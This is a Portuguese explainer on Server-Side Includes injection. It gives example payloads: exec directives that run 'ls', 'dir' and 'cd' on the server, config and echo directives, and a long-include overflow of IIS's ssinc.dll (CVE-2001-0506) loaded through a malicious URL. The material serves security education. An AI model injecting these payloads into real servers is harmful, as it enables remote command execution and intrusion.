Injeção Server-Side Includes

Descrição

SSIs são diretrizes presentes em aplicações Web usadas​para alimentar uma página HTML com conteúdos dinâmicos. Eles são semelhantes aos CGIs, exceto que SSIs são usados​para executar algumas ações antes da página atual ser carregada ou enquanto a página está sendo visualizada. A fim de fazer isso, o servidor web analisa SSI antes de fornecer a página para o usuário.
A Server-Side Inclui ataque permite a exploração de uma aplicação web, injetando os scripts em páginas HTML ou executar códigos arbitrários remotamente. Ele pode ser explorado através da manipulação de SSI em uso no aplicativo ou forçar o seu uso através de campos de entrada do usuário.


< ! # = / . " - > and [a-zA-Z0-9] 


Outra forma de descobrir se o aplicativo é vulnerável é verificar a presença de páginas com extensão .STM, .Shtm e .Shtml. No entanto, a falta deste tipo de páginas não significa que o aplicativo está protegido contra ataques de SSI.
Em qualquer caso, o ataque será bem sucedido apenas se o servidor web permitir a execução SSI sem validação adequada. Isso pode levar ao acesso e manipulação de sistema de arquivos e processos sob a permissão do proprietário do processo do servidor web.
O atacante pode acessar informações confidenciais, tais como arquivos de senhas, e executar comandos shell. As diretivas SSI são injetadas em campos de entrada e elas são enviados para o servidor web. O servidor web analisa e executa as directivas antes de fornecer a página. Então, o resultado do ataque será visível na próxima vez que a página é carregada para o navegador do usuário.

Exemplos

Exemplo 1 ~
Os comandos utilizados para injectar SSI varia de acordo com o sistema operacional de servidor em uso. Os comandos a seguir representam a sintaxe que deve ser usado para executar comandos do sistema operacional.

Linux:
Lista de arquivos do diretório:


< !--#exec cmd="ls" -->


Acesso de diretórios:

Windows:
Lista de arquivos do diretório:


< !--#exec cmd="dir" -->


Diretórios de acesso:

< !--#exec cmd="cd C:\admin\dir">


Exemplo 2 ~
Outros exemplos SSI que podem ser usados​para acessar e configurar as informações do servidor:
Para alterar a saída de mensagem de erro:

<!--#config errmsg="File not found, informs users and password"-->


Para mostrar o atual nome de arquivo do documento:

<!--#echo var="DOCUMENT_NAME" -->

Para mostrar o nome do arquivo de diretório virtual:

<!--#echo var="DOCUMENT_URI" -->

Usando o comando "config" e o parâmetro "timefmt", é possível controlar o formato da data e hora de saída:

<!--#config timefmt="A %B %d %Y %r"-->

Usando o comando "fsize", é possível imprimir o tamanho do ficheiro seleccionado:

<!--#fsize file="ssi.shtml" -->


Exemplo 3 ~
Uma velha vulnerabilidade no IIS versões 4.0 e 5.0 permite que um atacante obtenha privilégios de sistema através de uma falha de buffer overflow em uma biblioteca de vínculo dinâmico (ssinc.dll). O "ssinc.dll" é usado para processo intérprete Server-Side Includes. CVE 2001-0506.
Ao criar uma página contendo o código malicioso SSI abaixo e forçando a aplicação para carregar esta página (Path Traversal ataque), é possível realizar esse ataque:
ssi_over.shtml


<!--#include file=”UUUUUUUU...UU”-->


PS: O número de "U" deve ser mais longo do que 2049.
Forçar a aplicação para carregar a página ssi_over.shtml:
URL não-maliciosa:


www.vulnerablesite.org/index.asp?page=news.asp


URL maliciosa:

www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml


Se o IIS retorna uma página em branco que indica que ocorreu um estouro. Neste caso, o atacante pode manipular o fluxo de processo e executa um código arbitrário.